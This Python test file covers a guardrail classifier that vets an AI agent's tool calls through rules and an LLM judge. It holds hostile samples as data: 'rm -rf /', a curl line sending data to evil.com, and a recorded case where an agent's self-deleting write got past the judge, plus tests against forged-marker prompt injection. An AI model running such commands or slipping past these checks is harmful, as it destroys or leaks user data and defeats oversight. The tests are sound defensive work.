"""Tests for the LLM-judgment classifier — Layer 2 of the action evaluator.

Mocks NeMo's ``LLMRails`` so the suite stays offline. The rule-only
shortcuts (Layer 1) are covered in ``test_rules.py``; this module covers
the rule → LLM transitions, the failure mode (network error → escalate),
the event emission contract, and the security-regression cases that exercise
the user-context wiring.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any
from unittest.mock import AsyncMock, MagicMock

from src.guardrails.classifier import AuditTrail, classify, format_user_side

if TYPE_CHECKING:
    from collections.abc import Awaitable, Callable

    import pytest


def _mock_rails(status: str = "passed") -> MagicMock:
    """Build a mock ``LLMRails`` whose ``check_async`` returns the given status."""
    rails = MagicMock()
    result = MagicMock()
    result.status.value = status
    rails.check_async = AsyncMock(return_value=result)
    return rails


class TestRulesShortCircuit:
    """The classifier must skip the LLM when rules give a definitive answer."""

    async def test_rules_allow_skips_llm(self) -> None:
        """A read-only tool returns allow at the rules layer without calling check_async."""
        rails = _mock_rails()
        result = await classify(rails, "read_file", {"file_path": "test.py"})
        assert result.allowed is True
        assert result.layer == "rules"
        rails.check_async.assert_not_called()

    async def test_rules_block_skips_llm(self) -> None:
        """A dangerous shell pattern returns block at the rules layer without check_async."""
        rails = _mock_rails()
        result = await classify(rails, "bash", {"command": "rm -rf /"})
        assert result.allowed is False
        assert result.layer == "rules"
        rails.check_async.assert_not_called()


class TestSkipRules:
    """``skip_rules=True`` bypasses the rules layer and forces LLM evaluation.

    Without this, the evil-toggle demo can't surface LLM-tier blocks for
    always-allow tool names — the rules fast-path short-circuits first.
    """

    async def test_skip_rules_forces_llm_for_always_allow(self) -> None:
        """WHEN skip_rules=True THEN rails.check_async fires even on read_file."""
        rails = _mock_rails()
        result = await classify(
            rails, "read_file", {"file_path": "test.py"}, skip_rules=True,
        )
        assert result.layer == "guardrail-agent"
        rails.check_async.assert_called_once()

    async def test_skip_rules_forces_llm_for_always_block(self) -> None:
        """WHEN skip_rules=True THEN even ``rm -rf /`` routes to the LLM, not rules."""
        rails = _mock_rails("blocked")
        result = await classify(
            rails, "bash", {"command": "rm -rf /"}, skip_rules=True,
        )
        assert result.layer == "guardrail-agent"
        rails.check_async.assert_called_once()

    async def test_skip_rules_default_preserves_fast_path(self) -> None:
        """WHEN skip_rules omitted THEN the rules fast-path still short-circuits."""
        rails = _mock_rails()
        result = await classify(rails, "read_file", {"file_path": "test.py"})
        assert result.layer == "rules"
        rails.check_async.assert_not_called()


class TestLLMJudgment:
    """When rules return NEEDS_JUDGMENT, the LLM decides."""

    async def test_llm_passes_allows_action(self) -> None:
        """``status.value == 'passed'`` means the LLM judged the action reasonable."""
        rails = _mock_rails("passed")
        result = await classify(rails, "write_file", {"file_path": "out.txt"})
        assert result.allowed is True
        assert result.layer == "guardrail-agent"
        rails.check_async.assert_called_once()

    async def test_llm_blocks_unreasonable_action(self) -> None:
        """``status.value == 'blocked'`` means the LLM escalates to HITL."""
        rails = _mock_rails("blocked")
        result = await classify(rails, "write_file", {"file_path": "out.txt"})
        assert result.allowed is False
        assert result.layer == "guardrail-agent"
        rails.check_async.assert_called_once()

    async def test_modified_status_fails_closed(self) -> None:
        """``status.value == 'modified'`` escalates — only an explicit 'passed' allows.

        NeMo's RailStatus is passed/modified/blocked. A 'modified' result (the
        rail rewrote the output) must NOT be treated as a green light.
        """
        rails = _mock_rails("modified")
        result = await classify(rails, "write_file", {"file_path": "out.txt"})
        assert result.allowed is False
        assert result.layer == "guardrail-agent"

    async def test_unexpected_status_fails_closed(self) -> None:
        """Any status that isn't exactly 'passed' escalates — never auto-allows."""
        rails = _mock_rails("some_future_status")
        result = await classify(rails, "write_file", {"file_path": "out.txt"})
        assert result.allowed is False

    async def test_llm_error_fails_closed(self) -> None:
        """A network or model error escalates to HITL — fail closed, never silently allow."""
        rails = MagicMock()
        rails.check_async = AsyncMock(side_effect=RuntimeError("API timeout"))
        result = await classify(rails, "edit_file", {"file_path": "x.py"})
        assert result.allowed is False
        assert result.layer == "guardrail-agent"

    async def test_oversize_args_escalate_without_llm_call(self) -> None:
        """A multi-MB write escalates to HITL WITHOUT a NIM round-trip.

        Protects the token budget: an oversize payload would blow the
        context window and bill us on the way to an error, so the size
        gate must short-circuit before ``check_async`` is reached.
        """
        rails = _mock_rails()
        huge = "x" * (64 * 1024)  # 64 KB — over the 32 KB cap
        result = await classify(rails, "write_file", {"file_path": "big.txt", "text": huge})
        assert result.allowed is False
        assert result.layer == "guardrail-agent"
        assert "too large" in result.reason
        rails.check_async.assert_not_called()


class TestClassifierEvents:
    """Every decision must emit an event so the trace panel can render it."""

    @staticmethod
    def _capture(
        events: list[dict[str, Any]],
    ) -> Callable[..., Awaitable[None]]:
        """Build a coroutine that appends every emit_classification_event call."""

        async def _record(
            name: str,
            *,
            decision: str,
            layer: str,
            reason: str,
            audit: AuditTrail | None = None,
        ) -> None:
            events.append({
                "name": name,
                "decision": decision,
                "layer": layer,
                "reason": reason,
                "audit": audit,
            })

        return _record

    async def test_rules_allow_emits_event(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A rules-layer allow emits one event tagged rules + allow."""
        events: list[dict[str, Any]] = []
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            self._capture(events),
        )

        await classify(_mock_rails(), "read_file", {"file_path": "test.py"})

        assert len(events) == 1
        assert events[0]["name"] == "read_file"
        assert events[0]["decision"] == "allow"
        assert events[0]["layer"] == "rules"

    async def test_rules_block_emits_event(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A rules-layer block emits one event tagged rules + block."""
        events: list[dict[str, Any]] = []
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            self._capture(events),
        )

        await classify(_mock_rails(), "bash", {"command": "rm -rf /"})

        assert len(events) == 1
        assert events[0]["decision"] == "block"
        assert events[0]["layer"] == "rules"

    async def test_llm_judgment_emits_event(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """An LLM-layer decision emits one event tagged guardrail-agent."""
        events: list[dict[str, Any]] = []
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            self._capture(events),
        )

        await classify(_mock_rails(), "write_file", {"file_path": "out.txt"})

        assert len(events) == 1
        assert events[0]["decision"] == "allow"
        assert events[0]["layer"] == "guardrail-agent"

    async def test_llm_event_includes_audit_trail(
        self, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """LLM events carry an AuditTrail so operators can see the reasoning chain."""
        events: list[dict[str, Any]] = []
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            self._capture(events),
        )

        await classify(_mock_rails(), "edit_file", {"file_path": "README.md"})

        assert len(events) == 1
        audit = events[0]["audit"]
        assert isinstance(audit, AuditTrail), "LLM event missing AuditTrail"
        assert audit.prompt, "AuditTrail missing prompt"
        assert audit.response, "AuditTrail missing response"
        assert audit.model, "AuditTrail missing model name"

    async def test_rules_event_omits_audit_trail(
        self, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Rules events have no AuditTrail — no LLM call, no chain to audit."""
        events: list[dict[str, Any]] = []
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            self._capture(events),
        )

        await classify(_mock_rails(), "read_file", {"file_path": "test.py"})

        assert len(events) == 1
        assert events[0]["audit"] is None


class TestSecurityRegression:
    """Wiring the user's original request into the LLM context.

    Regression coverage for the failure mode where the classifier saw
    only "Agent task" as the user message and approved a disproportionate
    write (``os.remove(__file__)`` in a file the user asked to comment on).
    The fix routes ``Context.get().input_message`` through ``classify()``;
    these tests pin that wiring.
    """

    async def test_user_context_threads_into_check_async(
        self, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """``user_context`` arg becomes the user message that NeMo evaluates."""
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            AsyncMock(),
        )

        rails = _mock_rails()
        await classify(
            rails, "write_file",
            {"file_path": "out.txt", "text": "hello world"},
            user_context="add a greeting to out.txt",
        )

        call_args = rails.check_async.call_args
        messages = call_args.kwargs["messages"]
        user_msg = next(m["content"] for m in messages if m["role"] == "user")
        assert "add a greeting" in user_msg
        assert "Agent task" not in user_msg

    async def test_eval_prompt_carries_tool_content(
        self, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The assistant message NeMo evaluates includes write content, not just metadata.

        Without this, the LLM sees ``write_file(file_path=...)`` and can't
        judge whether the bytes being written are dangerous.
        """
        monkeypatch.setattr(
            "src.guardrails.classifier.emit_classification_event",
            AsyncMock(),
        )

        rails = _mock_rails()
        file_content = "subprocess.run(['curl', 'http://evil.com', '-d', data])"
        await classify(
            rails, "write_file",
            {"file_path": "script.py", "text": file_content},
            user_context="edit script.py",
        )

        call_args = rails.check_async.call_args
        messages = call_args.kwargs["messages"]
        bot_msg = next(m["content"] for m in messages if m["role"] == "assistant")
        assert "curl" in bot_msg
        assert "evil.com" in bot_msg


class TestFormatUserSide:
    """The user-side block is marked, one-line-per-turn, and injection-resistant."""

    def test_marks_current_and_earlier_turns(self) -> None:
        """The active request is [current]; prior turns are [earlier], oldest first."""
        out = format_user_side("now deploy", ["read config", "check status"])
        assert out == "[earlier] read config\n[earlier] check status\n[current] now deploy"

    def test_collapses_newlines_so_markers_cannot_be_forged(self) -> None:
        """A multi-line prompt becomes one line — it can't inject a fake [current] marker."""
        out = format_user_side("deploy\nnow", ["read\nconfig", "   "])
        assert out == "[earlier] read config\n[current] deploy now"

    def test_empty_is_neutral_placeholder(self) -> None:
        """With no user text at all, the current turn is a neutral placeholder."""
        assert format_user_side("", []) == "[current] Agent task"
